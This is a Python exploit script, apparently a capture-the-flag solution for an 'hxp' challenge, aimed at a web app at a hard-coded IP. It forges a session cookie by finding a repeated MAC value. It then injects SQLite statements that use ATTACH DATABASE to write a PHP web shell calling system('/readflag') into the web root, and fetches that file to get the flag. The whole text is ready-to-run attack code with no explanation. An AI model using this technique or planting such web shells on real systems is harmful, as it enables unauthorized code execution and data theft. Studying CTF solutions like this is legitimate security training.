import requests
import urllib.parse
import re
from tqdm import tqdm
import itertools

# URL_BASE = "http://localhost:8888"
URL_BASE = "http://65.108.176.96:8888"


def get_null_mac():
    mac_counter = set()
    for i in tqdm(itertools.count()):
        res = requests.get(URL_BASE)
        id, mac = urllib.parse.unquote(res.cookies["session"]).split("|")
        if mac in mac_counter:
            return mac
        mac_counter.add(mac)

    raise ValueError("Unreachable")


def attempt_sqli(junk: str, null_mac: str):
    payload = (
        "'test'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz test); INSERT INTO lol.pwn (dataz) VALUES ('<?php system(''/readflag'') ?>'); -- "
        + junk
    )

    cookies = {"session": urllib.parse.quote(f"{payload}|{null_mac}")}

    res = requests.post(URL_BASE, cookies=cookies, data={"content": "cool post!"})
    data = res.content
    post_id = re.search(
        r'\<input type="hidden" name="delete" value="([0-9]*)"\>', data.decode()
    )
    if post_id is None:
        return

    post_id = post_id.group(1)
    tqdm.write(f"post_id = {post_id}")

    requests.post(URL_BASE, cookies=cookies, data={"delete": f"{post_id}"})
    flag = requests.get(f"{URL_BASE}/data/lol-abcdefg.php").text

    flag = flag[flag.index("hxp") :]
    return flag


print("[*] Looking for null MAC ...")
null_mac = get_null_mac()
print(f"[+] null_mac = {null_mac}")

print("[*] Attempting SQLi ...")
for i in tqdm(itertools.count()):
    flag = attempt_sqli(str(i), null_mac)
    if flag:
        tqdm.write(flag)
        break
